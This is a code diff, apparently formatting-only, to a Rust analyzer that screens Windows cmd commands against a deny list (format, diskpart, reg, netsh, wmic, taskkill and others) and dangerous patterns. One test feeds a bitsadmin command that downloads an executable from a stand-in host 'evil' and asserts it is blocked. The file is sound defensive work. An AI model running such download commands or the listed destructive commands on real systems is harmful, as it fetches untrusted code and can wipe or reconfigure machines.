@@ -6,9 +6,9 @@ use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, Shel
 const SHELL_TYPE: ShellType = ShellType::Cmd;
 
 const DENIED_COMMANDS: &[&str] = &[
-    "format", "diskpart", "diskcomp", "diskcopy", "fdisk", "runas", "reg", "regedit",
-    "regedt32", "regini", "net", "net1", "netsh", "bcdedit", "bootcfg", "bootsect",
-    "wmic", "assoc", "ftype", "taskkill", "tskill",
+    "format", "diskpart", "diskcomp", "diskcopy", "fdisk", "runas", "reg", "regedit", "regedt32",
+    "regini", "net", "net1", "netsh", "bcdedit", "bootcfg", "bootsect", "wmic", "assoc", "ftype",
+    "taskkill", "tskill",
 ];
 
 pub const DANGEROUS_PATTERNS: &[&str] = &[
@@ -48,12 +48,14 @@ impl CmdAnalyzer {
     fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
         ResolvedShellPolicy {
             allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
-            denied_commands: policy.denied_commands.clone().unwrap_or_else(|| {
-                DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()
-            }),
-            dangerous_patterns: policy.dangerous_patterns.clone().unwrap_or_else(|| {
-                DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()
-            }),
+            denied_commands: policy
+                .denied_commands
+                .clone()
+                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
+            dangerous_patterns: policy
+                .dangerous_patterns
+                .clone()
+                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
             allow_pipe: policy.allow_pipe.unwrap_or(true),
             allow_redirect: policy.allow_redirect.unwrap_or(true),
         }
@@ -116,9 +118,7 @@ impl ShellAnalyzer for CmdAnalyzer {
             }
         };
 
-        if !policy.allowed_commands.is_empty()
-            && !policy.allowed_commands.contains(&primary)
-        {
+        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
             return ShellAnalysisResult {
                 allowed: false,
                 reason: Some(format!("Command not in whitelist: {primary}")),
@@ -241,7 +241,10 @@ mod tests {
 
     #[test]
     fn test_denies_bitsadmin() {
-        let result = analyze("bitsadmin /transfer job http://evil/file.exe C:\\out.exe", &empty_policy());
+        let result = analyze(
+            "bitsadmin /transfer job http://evil/file.exe C:\\out.exe",
+            &empty_policy(),
+        );
         assert!(!result.allowed);
     }
 
